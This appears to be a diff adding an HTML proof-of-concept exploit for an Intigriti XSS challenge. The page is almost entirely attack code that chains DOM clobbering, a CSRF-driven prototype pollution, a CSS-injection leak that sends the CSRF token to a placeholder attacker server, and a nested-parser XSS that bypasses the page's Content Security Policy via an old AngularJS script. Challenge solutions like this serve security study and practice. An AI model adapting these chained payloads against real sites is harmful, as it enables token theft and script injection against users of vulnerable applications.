@@ -1,0 +1,56 @@
+<html>
+    <body>
+        <!-- CSRF to update-theme.php to perform prototype pollution-->
+        <form id=updateTheme method="POST" type="submit" target="newWindow" action = "https://challenge-0822.intigriti.io/challenge/theme.php" enctype="text/plain">
+            <input name='{"__proto__":{"timeout":{"dark":"99999","light":"99999"},"match":{"dark":"1","light":"1"}},"primary":{"text":{"dark":"#47fb4e","light":"#666"},"bg":{"dark":"#2a2944","light":"#fcfcfc"}},"secondary":{"text":{"dark":"#ffffff","light":"#404594"},"bg":{"dark":"#ffaf00","light":"#ffe1a0' value='"}}}'>
+        </form>
+        <!-- CSRF by leaking token and using that to perform our nested XSS + CSP bypass-->
+        <form id=preview method="POST" target="newWindow" action = "https://challenge-0822.intigriti.io/challenge/preview.php">
+            <input name="csrf-token" value="">
+            <input name="desc" value="">
+            <input name="name" value="XSS">
+          </form>
+        <button onclick="xss()">kill</button>
+        <script>
+            var url = 'https://challenge-0822.intigriti.io/challenge';
+            var serverURL = 'https://HOST:PORT';
+
+            function protoPollution() {
+                document.getElementById("updateTheme").submit();
+            }
+            function doXSS(token) {
+                let xss = `
+                https://www.youtube.com/embed/dQw4w9WgXcQ/srcdoc=<script//src="https://cdnjs.cloudflare.com/ajax/libs/tmlib.js/0.5.2/tmlib.min.js"><\/script><script//src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"><\/script><div//ng-app//ng-csp>{{[].clear.call().alert([].clear.call().document.domain)}}</div>/a.png
+                `;
+                document.querySelector('#preview input[name=desc]').setAttribute('value', xss);
+                document.querySelector('#preview input[name=csrf-token]').setAttribute('value', token);
+                preview.submit();
+            }   
+            function leakToken() {
+                cssPayload = `WAIT!
+                <svg>
+                    <style>
+                        @import url('https://HOST:PORT/start?len=32&');
+                    </style>
+                </svg>
+                `
+                fetch(serverURL + '/result')
+                    .then(res => res.text())
+                    .then(res => {
+                        //step 4 - Use CSRF token to perform CSRF now
+                        doXSS(res);
+                    })
+                //step 5 - Abuse nested parser and bypass CSP to finally pop an alert
+                window.open(url + '/app.php#msg=' + encodeURIComponent(cssPayload));
+            }
+            function xss() {
+                //step 1 - login, DOM Clobbering'
+                lg = window.open(url + '/login.php?name="><img name=domain>');
+                //step 2 - prototype pollution
+                setTimeout(() => protoPollution(), 4000);           
+                //step 3 - XS-Leaks via CSS Injection
+                setTimeout(() => leakToken(), 6000);
+            }
+        </script>
+    </body>
+</html>
